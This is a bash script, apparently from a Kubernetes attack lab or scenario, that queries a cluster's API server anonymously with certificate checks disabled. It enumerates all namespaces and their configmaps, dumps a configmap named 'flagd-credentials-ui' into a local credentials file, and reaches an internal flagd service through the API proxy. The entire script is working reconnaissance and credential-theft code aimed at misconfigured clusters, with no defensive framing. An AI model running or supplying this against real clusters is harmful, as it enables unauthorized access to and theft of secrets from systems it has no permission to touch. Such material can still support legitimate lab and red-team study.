#!/usr/bin/env bash
set -euo pipefail

# ===== Config =====
API_SERVER="https://$CLUSTER_NAME-control-plane:6443"
NSPROTO="${NSPROTO:-app}"
NSCREDS="${NSCREDS:-mem}"

CMNAME="flagd-credentials-ui"
FNPROTO="$DATA_PATH/KC3/demo.proto"
FNCREDS="$DATA_PATH/KC3/credentials"

# Installing dependencies and setup
apt-get update >/dev/null 2>&1
apt-get install -y --no-install-recommends bash curl jq ca-certificates >/dev/null 2>&1
mkdir -p $DATA_PATH/KC3

echo "[*] Request /healthz /version /apis /namespaces to API"
curl -k $API_SERVER/healthz > /dev/null
curl -k $API_SERVER/version > /dev/null
curl -k $API_SERVER/apis > /dev/null
mapfile -t NAMESPACES < <(curl -k $API_SERVER/api/v1/namespaces | jq -r '.items[].metadata.name')

echo "[*] Found ${#NAMESPACES[@]} namespace"
# 3. loop on each ns and download configmap
for ns in "${NAMESPACES[@]}"; do
  echo "=== Namespace: $ns ==="
  if ! resp="$(curl -fsSk "$API_SERVER/api/v1/namespaces/$ns/configmaps" 2>/dev/null)"; then
    echo "  (skip: curl failed)"
    continue
  fi
  # print names; if JSON empty/not valid, don't fail
  jq -r '.items[]?.metadata.name' <<<"$resp" 2>/dev/null || echo "  (no items / invalid JSON)"
  echo
done

curl -sk $API_SERVER/api/v1/namespaces/$NSPROTO/configmaps \
  | jq -r '.items[] | select(.metadata.name=="proto") | .data["demo.proto"]' > $FNPROTO

curl -sk "$API_SERVER/api/v1/namespaces/$NSCREDS/configmaps" \
| jq -r --arg CMNAME "$CMNAME" '
  .items[]
  | select(.metadata.name==$CMNAME)
  | .data[]' > "$FNCREDS"

echo "[*] Contacting flagd"
curl -k "$API_SERVER/api/v1/namespaces/$NSCREDS/services/flagd:4000/proxy/feature"